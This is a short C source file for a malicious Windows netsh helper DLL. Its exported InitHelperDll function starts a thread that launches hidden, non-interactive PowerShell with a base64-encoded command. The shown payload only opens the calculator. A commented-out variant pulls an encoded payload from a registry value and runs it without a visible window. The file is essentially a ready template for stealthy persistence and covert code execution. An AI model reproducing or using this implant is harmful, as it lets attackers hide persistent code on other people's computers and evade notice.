#include <stdio.h>
#include <windows.h>

DWORD WINAPI YahSure(LPVOID lpParameter)
{
	//Option 1: Quick and simple. Opens 1 PS proc & briefly displays window. Set payload to b64 unicode.
	system("start C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -win hidden -nonI -nopro -enc \
		   		cwB0AGEAcgB0ACAAYwBhAGwAYwA=");

	//Option 2: Execute loaded b64 into a reg key value. Will spin up a few etra procs, but will not open an extra window.
	//system("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c \
		   	$x=((gp HKLM:SOFTWARE\\Microsoft\\Notepad debug).debug); \
				powershell -nopro -enc $x 2> nul");
	return 1;

}

//Custom netsh helper format
extern "C" __declspec(dllexport) DWORD InitHelperDll(DWORD dwNetshVersion, PVOID pReserved)
{
	HANDLE hand;
	hand = CreateThread(NULL, 0, YahSure, NULL, 0, NULL);
	CloseHandle(hand);

	return NO_ERROR;
}
